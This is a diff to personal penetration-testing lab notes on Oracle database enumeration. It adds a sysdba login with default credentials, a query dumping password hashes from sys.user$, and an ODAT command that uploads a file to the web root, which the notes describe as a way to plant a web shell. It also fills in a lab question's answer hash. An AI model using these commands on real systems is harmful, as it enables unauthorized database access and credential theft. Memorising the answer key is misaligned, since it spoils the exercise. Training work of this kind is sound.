@@ -79,10 +79,18 @@ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-in
 select table_name from all_tables;
 ```
 
+[Database SQL Language Quick Reference](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
+
+
 **ORACLE RDBMS Enumeration - Logging in as Sys Admin**
-(substitute scott:tiger for robin:robin)
+
 ```
-sqlplus robin/robin@10.129.205.19/XE as sysdba
+sqlplus scott/tiger@10.129.205.19/XE as sysdba
+```
+
+**Enumerate the Database**
+```
+select * from user_role_privs;
 ```
 
 **Extracting Password Hashes**
@@ -90,10 +98,27 @@ sqlplus robin/robin@10.129.205.19/XE as sysdba
 select name, password from sys.user$;
 ```
 
+#### Oracle RDBMS - File Upload 
+
+The above can be done via uploading a web shell to the target. However you must know the exact location of the root directory for the web server. In Linux it is /var/www/html and Windows C:\inetpub\wwwroot.
+
+
+```
+echo "Oracle File Upload Test" > testing.txt
+```
+```
+./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
+```
+
+**Use curl to verify the file upload worked**
+```
+curl -X GET http://10.129.204.235/testing.txt
+```
 ### Questions
 
 Enumerate the target Oracle database and submit the password hash of the user DBSNMP as the answer.
 ```
+E066D214D5421CCC
 ```
 
 Nmap
